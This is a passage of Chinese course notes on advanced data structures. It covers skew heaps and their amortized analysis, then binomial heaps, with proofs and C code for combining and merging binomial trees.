</span><span id="__span-2-35"><a id="__codelineno-2-35" name="__codelineno-2-35" href="#note-ads-wk3_2-__codelineno-2-35"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">h</span><span class="o">-&gt;</span><span class="n">right</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="err">；</span>
</span><span id="__span-2-36"><a id="__codelineno-2-36" name="__codelineno-2-36" href="#note-ads-wk3_2-__codelineno-2-36"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">h</span><span class="o">-&gt;</span><span class="n">left</span><span class="o">==</span><span class="nb">NULL</span><span class="o">||</span><span class="n">h</span><span class="o">-&gt;</span><span class="n">left</span><span class="o">-&gt;</span><span class="n">npl</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">h</span><span class="o">-&gt;</span><span class="n">right</span><span class="o">-&gt;</span><span class="n">npl</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-37"><a id="__codelineno-2-37" name="__codelineno-2-37" href="#note-ads-wk3_2-__codelineno-2-37"></a><span class="w">        </span><span class="n">swap</span><span class="p">(</span><span class="n">h</span><span class="o">-&gt;</span><span class="n">left</span><span class="p">,</span><span class="w"> </span><span class="n">h</span><span class="o">-&gt;</span><span class="n">right</span><span class="p">);</span>
</span><span id="__span-2-38"><a id="__codelineno-2-38" name="__codelineno-2-38" href="#note-ads-wk3_2-__codelineno-2-38"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-2-39"><a id="__codelineno-2-39" name="__codelineno-2-39" href="#note-ads-wk3_2-__codelineno-2-39"></a><span class="w">    </span><span class="n">npl_update</span><span class="p">(</span><span class="n">h</span><span class="p">);</span>
</span><span id="__span-2-40"><a id="__codelineno-2-40" name="__codelineno-2-40" href="#note-ads-wk3_2-__codelineno-2-40"></a><span class="p">}</span>
</span></code></pre></div>
<h2 id="note-ads-wk3_2-_6">斜堆<a class="headerlink" href="#note-ads-wk3_2-_6" title="Permanent link">&para;</a></h2>
<p>斜堆与左式堆的关系就像是 splay 树和 AVL 树之间的关系。回顾 splay 树，它并不需要维护 AVL 树中的 bf 属性，只需要在访问一个结点之后就无脑地将它用 zig/zig-zig/zig-zag 三种情况将它翻到根结点即可。</p>
<p>斜堆也是类似的想法，它不用再维护 Npl，因此在递归过程中左式堆所有维护结构性质以及更新 Npl 的</p>
<p>操作不再需要，取而代之的是如下操作:</p>
<div class="admonition definition">
<p class="admonition-title">斜堆</p>
<ol>
<li>
<p>在 base case 是处理 H 与 null 连接的情况时，左式堆直接返回 H 即可，但斜堆必须看 H 的右路径，我们要求 H 右路径上除了最大结点之外都必须交换其左右孩子。</p>
</li>
<li>
<p>在非 base case 时，若 H1 的根结点小于 H2，如果是左式堆，我们需要合并 H1 的右子树和 H2作为 H1 的新右子树，最后再判断这样是否违反性质决定是否交换左右孩子，斜堆直接无脑交换，也就是说每次这种情况都把 H1 的左孩子换到右孩子的位置，然后把新合并的插入在 H1 的左子树上。</p>
</li>
</ol>
</div>
<p>总的来说，斜堆的基本操作与左式堆类似，但是每一次递归完毕都进行不加判断大小的交换操作</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p><div align=center><img src="../NOTE/ADS/part1/17.png" width="70%"></div></p>
<p>如果我们像前面分析左式堆那样展开递归的每一步，前面的过程很好理解，就是无脑交换根的 key 更小的堆的左右孩子，关键在于当递归到最深的一层我们看到实际上是merge 一个 null 堆和一个 18 为根、35 为 18 的左孩子的堆，我们看上面操作的第一条，这个堆的右路径上除了最大结点外都要交换左右孩子，但幸运的是，这个堆右路径只有 18 一个结点，它是最大的，所以无需交换。维基百科等地方的斜堆 base case 之后都无需操作，但这里可能还有操作</p>
<p>最后合并出的堆的左路径上讲包含两个原始堆的右路径排序后的结果，当然后面还可能连着原始堆右路径最大值的一些左孩子（因为这些左孩子是不被交换的）</p>
</div>
<h3 id="note-ads-wk3_2-_7">斜堆的摊还分析<a class="headerlink" href="#note-ads-wk3_2-_7" title="Permanent link">&para;</a></h3>
<p>斜堆的期望类似于Splay tree，<strong>Any M consecutive operations take at most <span class="arithmatex">\(O(M \log N)\)</span> time</strong>,为了证明这个，我们仍然需要用势函数法来进行摊还分析。</p>
<p>定义势函数之前，我们要先定义一些其它的东西</p>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>我们称一个结点 P 是重的（heavy），如果它的右子树结点个数至少是 P 的所有后代的一半（后代包括 P 自身）。反之称为轻结点（light node）</p>
</div>
<div class="admonition property">
<p class="admonition-title">引理</p>
<p>对于右路径上有 <span class="arithmatex">\(l\)</span> 个轻结点的斜堆，整个斜堆至少有 <span class="arithmatex">\(2^l − 1\)</span> 个结点，这意味着一个 <span class="arithmatex">\(n\)</span> 个结点的斜堆右路径上的轻结点个数为 <span class="arithmatex">\(O(\log n)\)</span>。</p>
<p>我们可以使用数学归纳法来证明：</p>
<p>首先，对于l=1,整棵树至少有<span class="arithmatex">\(2^1-1=1\)</span>个结点，结论是正确的；
假设对于右路径上有小于等于<span class="arithmatex">\(l\)</span>个轻结点的斜堆，整个斜堆至少有<span class="arithmatex">\(2^l-1\)</span>个结点的结论都成立
现在考虑右路径上有<span class="arithmatex">\(l+1\)</span>个轻结点的斜堆。
设右路径上第一个轻结点为P，如果把这个结点及其左子树一起删除，则至少删除了以P为根的子树的所有的结点的一半再加一(右子树节点数加根)，因为P是轻的；则剩下的右路径上有<span class="arithmatex">\(l\)</span>个轻结点，根据归纳假设，剩下的结点至少有<span class="arithmatex">\(2^l-1\)</span>个，加上删掉的结点，整个斜堆至少有<span class="arithmatex">\(2*(2^l-1)+1\)</span></p>
</div>
<p>我们需要证明的是</p>
<p><strong>若我们有两个斜堆 <span class="arithmatex">\(H1\)</span> 和 <span class="arithmatex">\(H2\)</span>，它们分别有 <span class="arithmatex">\(n_1\)</span> 和 <span class="arithmatex">\(n_2\)</span> 个结点，则合并 <span class="arithmatex">\(H1\)</span> 和 <span class="arithmatex">\(H2\)</span> 的摊还时间复杂度为 <span class="arithmatex">\(O(\log n)\)</span>，其中 <span class="arithmatex">\(n = n_1 + n_2\)</span>。</strong></p>
<p>因为insert和delete都是以merge为基础的，所以我们只需要证明merge的摊还时间复杂度即可。</p>
<div class="admonition proof">
<p class="admonition-title">Proof</p>
<p>证明: 我们定义势函数 <span class="arithmatex">\(\Phi(Hi)\)</span> 等于堆 <span class="arithmatex">\(Hi\)</span> 的重结点（heavy node）的个数，并令 H3 为合并后的新堆.我们设 <span class="arithmatex">\(Hi(i = 1, 2)\)</span> 的右路径上的轻结点数量为 <span class="arithmatex">\(li\)</span>，重结点数量为 <span class="arithmatex">\(hi\)</span>，因此真实的合并操作最坏的时间复杂度为 </p>
<div class="arithmatex">\[ci = l1 + l2 + h1 + h2\]</div>
<p>(所有操作都在右路径上完成)。因此根据摊还分析我们知道摊还时间复杂度为</p>
<div class="arithmatex">\[
    \hat{ci} = ci + \Phi(H3) − (\Phi(H1) + \Phi(H2))
\]</div>
<p>事实上，在 merge 前我们可以记<span class="arithmatex">\(\Phi(H1) + \Phi(H2) = h1 + h2 + h\)</span>,其中 <span class="arithmatex">\(h\)</span> 表示不在右路径上的重结点个数。现在我们要考察合并后的情况，事实上我们有两个非常重要的观察：</p>
<ol>
<li>
<p>只有在 H1 和 H2 右路径上的结点才可能改变轻重状态，这是很显然的，因为其它结点合并前后子树是完全被复制的，所以不可能改变轻重状态；</p>
</li>
<li>
<p>H1 和 H2 右路径上的重结点在合并后一定会变成轻结点，这是因为右路径上结点一定会交换左右子树，并且后续所有结点也都会继续插入在左子树上（这也表明轻结点不一定变为重结点）。结合以上两点，我们知道合并后原本不在右路径上的 h 个重结点仍然是重结点，在右路径上的<span class="arithmatex">\(h1 + h2\)</span>个重结点全部变成轻结点，<span class="arithmatex">\(l1 + l2\)</span> 个轻结点不一定都变重，因此合并后我们有<span class="arithmatex">\(\Phi(H3) \leqslant l1 + l2 + h\)</span>,代入数据计算可得</p>
</li>
</ol>
<div class="arithmatex">\[
    \hat{ci} \leqslant (l1 + l2 + h1 + h2) + (l1 + l2 + h) − (h1 + h2 + h) = 2(l1 + l2).
\]</div>
<p>根据前面的引理，<span class="arithmatex">\(l1 + l2 = O(\log n_1 + \log n_2) = O(\log(n_1 + n_2)) = O(\log n)\)</span>（这里的等号之前有完全一样的说明过），并且注意到初始（空堆）势函数一定为 0。且之后总是非负的，所以这一势函数定义满足要求，因此我们的证明也就完成了。</p>
</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>对于斜堆和左式堆的合并,是<span class="arithmatex">\(O(\log n)\)</span>的，这个<span class="arithmatex">\(n\)</span>既可以是两个堆的大小之和，或者是<span class="arithmatex">\(\max(n1,n2)\)</span>,因为</p>
<div class="arithmatex">\[
    \log n_1+\log n_2 \leqslant 2 \log \max(n1,n2)
\]</div>
</div></section><section class="print-page" id="note-ads-wk4" heading-number="2.2.3.6"><h1 id="note-ads-wk4-binomial-heap">二项堆(Binomial Heap)<a class="headerlink" href="#note-ads-wk4-binomial-heap" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 2173 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 110 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 2 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 9 分钟</p>
</div>
<h2 id="note-ads-wk4-_1">二项堆的定义和性质<a class="headerlink" href="#note-ads-wk4-_1" title="Permanent link">&para;</a></h2>
<blockquote>
<p>在二叉堆(Binary Heap)的基础上，我们可以实现在可以在 <span class="arithmatex">\(O(n)\)</span>
时间内实现 <span class="arithmatex">\(n\)</span> 个结点的插入建堆操作，而之前讨论的左式堆和斜堆不可以</p>
</blockquote>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<ul>
<li>结构性质：</li>
<li>二项堆不是一棵树，而是由许多树组成的森林，其中每一棵树称为二项树</li>
<li>一个二项堆中的每棵树具有不同的高度，每一种高度的二项树最多只有一棵</li>
<li>高度为 0 的二项树是一棵单节点树；高度为 <span class="arithmatex">\(k\)</span> 的二项树 <span class="arithmatex">\(B_k\)</span> 通过将一棵二项树 <span class="arithmatex">\(B_{k−1}\)</span> 附接到另一棵二项树 <span class="arithmatex">\(B_{k−1}\)</span> 的根上而构成</li>
<li>序性质：每棵二项树都保持堆序性质(最小堆或者最大堆)</li>
</ul>
</div>
<p>根据二项堆的性质，我们有以下结论：</p>
<p><strong>二项树的节点数目</strong>：<span class="arithmatex">\(B_k\)</span> 的二项树具有 <span class="arithmatex">\(2^k\)</span> 个节点，这可以由递推很容易证明</p>
<p><strong>在深度为<span class="arithmatex">\(d\)</span>处的节点数恰好就是二项系数<span class="arithmatex">\(\begin{pmatrix} k \\ d \end{pmatrix}\)</span></strong></p>
<div class="admonition proof">
<p class="admonition-title">数学归纳法证明</p>
<p>对于 <span class="arithmatex">\(k = 0\)</span> 的情况显然正确，设直到 <span class="arithmatex">\(k\)</span> 结论都是正确的，则对于 <span class="arithmatex">\(B_k+1\)</span>，第一层和
最后一层只有一个结点是可以直接得到的，在其它层中，回忆二项堆的定义是由两个 <span class="arithmatex">\(B_k\)</span> 接起来的，因此在新树的深度为<span class="arithmatex">\(d\)</span>的地方，由两部分组成：</p>
<ul>
<li>一部分是在 <span class="arithmatex">\(B_k\)</span> 的深度为 <span class="arithmatex">\(d\)</span> 的地方，有 <span class="arithmatex">\(\begin{pmatrix} k \\ d \end{pmatrix}\)</span> 个结点</li>
<li>另一部分是在 <span class="arithmatex">\(B_k\)</span> 的深度为 <span class="arithmatex">\(d-1\)</span> 的地方，有 <span class="arithmatex">\(\begin{pmatrix} k \\ d-1 \end{pmatrix}\)</span> 个结点</li>
</ul>
<p>故我们只要证</p>
<div class="arithmatex">\[
\begin{pmatrix} k+1 \\ d \end{pmatrix} = \begin{pmatrix} k \\ d \end{pmatrix} + \begin{pmatrix} k \\ d-1 \end{pmatrix}
\]</div>
<p>这由二项数的性质很容易证明</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>可以将二项堆与二进制表示联系起来</p>
</div>
<h2 id="note-ads-wk4-_2">二项堆的操作<a class="headerlink" href="#note-ads-wk4-_2" title="Permanent link">&para;</a></h2>
<h3 id="note-ads-wk4-findmin">Findmin<a class="headerlink" href="#note-ads-wk4-findmin" title="Permanent link">&para;</a></h3>
<p>直接遍历所有树,注意到对于一个有<span class="arithmatex">\(n\)</span>个结点的二项堆，最多有<span class="arithmatex">\(\log n\)</span>棵树，因此时间复杂度为<span class="arithmatex">\(O(\log n)\)</span></p>
<p>也可以通过专门记录最小的节点来实现<span class="arithmatex">\(O(1)\)</span>的时间复杂度，当然在DeleteMin的时候需要重新找到最小的节点并更新</p>
<h3 id="note-ads-wk4-insert-merge">Insert &amp; merge<a class="headerlink" href="#note-ads-wk4-insert-merge" title="Permanent link">&para;</a></h3>
<p>插入是特殊的合并操作，我们可以将一个新的节点看作是一个只有一个节点的二项堆，然后将其与原来的二项堆合并即可；</p>
<p>合并操作的过程十分类似二进制数的加法，例如一个二项堆有<span class="arithmatex">\(B_3,B_2,B_0\)</span>,其二进制表示为<span class="arithmatex">\(1101\)</span>，另一个二项堆有<span class="arithmatex">\(B_3,B_1,B_0\)</span>，其二进制表示为<span class="arithmatex">\(1011\)</span>，我们可以将其看作是二进制数相加，然后将进位的部分合并得到新的二进制数<span class="arithmatex">\(11000\)</span>,则新的二项堆为<span class="arithmatex">\(B_4,B_3\)</span>，我们需要保证堆的存储顺序是按高度从小到大来排列，这样时间复杂度就是<span class="arithmatex">\(O(\log n)\)</span></p>
<p>对于从空开始插入建堆的时间复杂度我们需要做特殊的分析。因为我们是要平均时间的最坏情况，事实上也就是摊还代价。</p>
<div class="admonition note">
<p class="admonition-title">聚合法</p>
<p>聚合法需要每一步的操作复杂度，实际上我们随便模拟几步再结合之前讨论的合并和二进制加法之间的关系就可以发现，插入的整个操作与二进制数加1有完全的对应关系：若是遇到了某一位是<span class="arithmatex">\(1+1\)</span>，则用常数操作完成简单的合并即可，如果遇到<span class="arithmatex">\(0+1\)</span>，那么当前所有的二项树合起来就是最后的结果。基于这一观察我们知道，因为<span class="arithmatex">\(0+1\)</span>对应将0置1，<span class="arithmatex">\(1+1\)</span>对应1置0，这两种情况都对应于堆的常数时间操作，因此从空树连续插入<span class="arithmatex">\(n\)</span>的顶点的时间复杂度与<span class="arithmatex">\(0+1+1 \cdots (n \ of \ 1)\)</span>的过程中数据二进制表示中0和1比特翻转的次数总和。于是算法复杂度就很好计算了，因为我们知道<span class="arithmatex">\(n\)</span>对应于 
<span class="arithmatex">\(\lfloor \log n \rfloor+1\)</span>个二进制位，事实上最低位每次加1都会反转比特，次低位每两次运算反转比特，倒数第三位每4次运算反转比特......以此类推，<span class="arithmatex">\(n\)</span>次操作的整体时间复杂度与</p>
<div class="arithmatex">\[
  n+ \frac{n}{2} + \frac{n}{4} + \cdots + \dfrac{n}{2^{m}} = O(n),m=\lfloor \log n \rfloor+1
\]</div>
<p>有了这个结论，我们就可以知道，从空树开始插入<span class="arithmatex">\(n\)</span>个结点的时间复杂度是<span class="arithmatex">\(O(n)\)</span>的,故单步插入的摊还代价是<span class="arithmatex">\(O(1)\)</span>的</p>
</div>
<div class="admonition 势能法">
<p class="admonition-title">势能法</p>
<p>对于复杂的操作，对应着很多次的复位操作(1变0)和一次置位(0变1)操作，所以将势函数定义为 <span class="arithmatex">\(\Phi=\)</span>二项堆中二项树的个数，这样在一次操作之后势函数的会下降很多；</p>
<p>假设一次操作 <span class="arithmatex">\(c_i=k+1\)</span> 有 <span class="arithmatex">\(k\)</span> 次复位；那么</p>
<div class="arithmatex">\[
    \hat{c_i}=c_i+1-k=2
\]</div>
<p>故单步操作复杂度为<span class="arithmatex">\(O(1)\)</span></p>
</div>
<h2 id="note-ads-wk4-_3">二项堆的代码实现<a class="headerlink" href="#note-ads-wk4-_3" title="Permanent link">&para;</a></h2>
<p>因为每个结点的孩子数量可能不只有2个，因此我们使用LeftChild和NextSibling的组合实现。直观上来看用LeftChild和NextSibling是让二项树翻转了：原先是根的子树从左到右高度依次增大，现在依次减小了。并且为了方便索引每棵二项树，我们用一个数组存储每棵二项树的根，其中数组的索引就对应二项树的高度</p>
<div align="center">
    <img src="../NOTE/ADS/part1/18.png" width="70%">
</div>

<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>相当于让最大的孩子管着其它的兄弟</p>
</div>
<h3 id="note-ads-wk4-_4">结构定义<a class="headerlink" href="#note-ads-wk4-_4" title="Permanent link">&para;</a></h3>
<div class="language-c highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-ads-wk4-__codelineno-0-1"></a><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">BinNode</span><span class="w"> </span><span class="o">*</span><span class="n">Position</span><span class="p">;</span><span class="c1">//指针</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-ads-wk4-__codelineno-0-2"></a><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">Collection</span><span class="w"> </span><span class="o">*</span><span class="n">BinQueue</span><span class="p">;</span><span class="c1">//二项队列</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-ads-wk4-__codelineno-0-3"></a><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">BinNode</span><span class="w"> </span><span class="o">*</span><span class="n">BinTree</span><span class="p">;</span><span class="w">  </span><span class="c1">//二项树</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-ads-wk4-__codelineno-0-4"></a>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-ads-wk4-__codelineno-0-5"></a><span class="k">struct</span><span class="w"> </span><span class="nc">BinNode</span><span class="w"> </span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-ads-wk4-__codelineno-0-6"></a><span class="p">{</span><span class="w"> </span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-ads-wk4-__codelineno-0-7"></a><span class="w">    </span><span class="n">ElementType</span><span class="w">     </span><span class="n">Element</span><span class="p">;</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-ads-wk4-__codelineno-0-8"></a><span class="w">    </span><span class="n">Position</span><span class="w">        </span><span class="n">LeftChild</span><span class="p">;</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#note-ads-wk4-__codelineno-0-9"></a><span class="w">    </span><span class="n">Position</span><span class="w">        </span><span class="n">NextSibling</span><span class="p">;</span>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#note-ads-wk4-__codelineno-0-10"></a><span class="p">}</span><span class="w"> </span><span class="p">;</span>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#note-ads-wk4-__codelineno-0-11"></a>
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#note-ads-wk4-__codelineno-0-12"></a><span class="k">struct</span><span class="w"> </span><span class="nc">Collection</span><span class="w"> </span>
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#note-ads-wk4-__codelineno-0-13"></a><span class="p">{</span><span class="w"> </span>
</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#note-ads-wk4-__codelineno-0-14"></a><span class="w">    </span><span class="kt">int</span><span class="w">         </span><span class="n">CurrentSize</span><span class="p">;</span><span class="w">  </span><span class="cm">/* total number of nodes */</span>
</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#note-ads-wk4-__codelineno-0-15"></a><span class="w">    </span><span class="n">BinTree</span><span class="w"> </span><span class="n">TheTrees</span><span class="p">[</span><span class="w"> </span><span class="n">MaxTrees</span><span class="w"> </span><span class="p">];</span><span class="c1">//存储每棵二项树的根</span>
</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#note-ads-wk4-__codelineno-0-16"></a><span class="p">}</span><span class="w"> </span><span class="p">;</span>
</span></code></pre></div>
<h3 id="note-ads-wk4-o1">合并大小相同的树(<span class="arithmatex">\(O(1)\)</span>复杂度)<a class="headerlink" href="#note-ads-wk4-o1" title="Permanent link">&para;</a></h3>
<div class="language-c highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-ads-wk4-__codelineno-1-1"></a><span class="n">BinTree</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-ads-wk4-__codelineno-1-2"></a><span class="nf">CombineTrees</span><span class="p">(</span><span class="w"> </span><span class="n">BinTree</span><span class="w"> </span><span class="n">T1</span><span class="p">,</span><span class="w"> </span><span class="n">BinTree</span><span class="w"> </span><span class="n">T2</span><span class="w"> </span><span class="p">)</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-ads-wk4-__codelineno-1-3"></a><span class="p">{</span><span class="w">  </span><span class="cm">/* merge equal-sized T1 and T2 */</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#note-ads-wk4-__codelineno-1-4"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">T1</span><span class="o">-&gt;</span><span class="n">Element</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">T2</span><span class="o">-&gt;</span><span class="n">Element</span><span class="w"> </span><span class="p">)</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#note-ads-wk4-__codelineno-1-5"></a><span class="w">        </span><span class="cm">/* attach the larger one to the smaller one */</span>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#note-ads-wk4-__codelineno-1-6"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">CombineTrees</span><span class="p">(</span><span class="w"> </span><span class="n">T2</span><span class="p">,</span><span class="w"> </span><span class="n">T1</span><span class="w"> </span><span class="p">);</span>
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#note-ads-wk4-__codelineno-1-7"></a><span class="w">    </span><span class="cm">/* insert T2 to the front of the children list of T1 */</span>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#note-ads-wk4-__codelineno-1-8"></a><span class="w">    </span><span class="n">T2</span><span class="o">-&gt;</span><span class="n">NextSibling</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">T1</span><span class="o">-&gt;</span><span class="n">LeftChild</span><span class="p">;</span>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#note-ads-wk4-__codelineno-1-9"></a><span class="w">    </span><span class="n">T1</span><span class="o">-&gt;</span><span class="n">LeftChild</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">T2</span><span class="p">;</span>
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#note-ads-wk4-__codelineno-1-10"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">T1</span><span class="p">;</span>
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#note-ads-wk4-__codelineno-1-11"></a><span class="p">}</span>
</span></code></pre></div>
<div align="center">
    <img src="../NOTE/ADS/part1/19.png" width="70%">
</div>

<h3 id="note-ads-wk4-merge">Merge<a class="headerlink" href="#note-ads-wk4-merge" title="Permanent link">&para;</a></h3>
<div class="language-c highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-ads-wk4-__codelineno-2-1"></a><span class="n">BinQueue</span><span class="w">  </span><span class="nf">Merge</span><span class="p">(</span><span class="w"> </span><span class="n">BinQueue</span><span class="w"> </span><span class="n">H1</span><span class="p">,</span><span class="w"> </span><span class="n">BinQueue</span><span class="w"> </span><span class="n">H2</span><span class="w"> </span><span class="p">)</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#note-ads-wk4-__codelineno-2-2"></a><span class="p">{</span><span class="w">   </span><span class="n">BinTree</span><span class="w"> </span><span class="n">T1</span><span class="p">,</span><span class="w"> </span><span class="n">T2</span><span class="p">,</span><span class="w"> </span><span class="n">Carry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w">   </span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#note-ads-wk4-__codelineno-2-3"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">j</span><span class="p">;</span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#note-ads-wk4-__codelineno-2-4"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">CurrentSize</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">H2</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">CurrentSize</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">Capacity</span><span class="w"> </span><span class="p">)</span><span class="w">  </span><span class="n">ErrorMessage</span><span class="p">();</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#note-ads-wk4-__codelineno-2-5"></a><span class="w">    </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">CurrentSize</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">H2</span><span class="o">-&gt;</span><span class="w"> </span><span class="n">CurrentSize</span><span class="p">;</span>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#note-ads-wk4-__codelineno-2-6"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">j</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="o">&lt;=</span><span class="w"> </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">CurrentSize</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">,</span><span class="w"> </span><span class="n">j</span><span class="o">*=</span><span class="mi">2</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
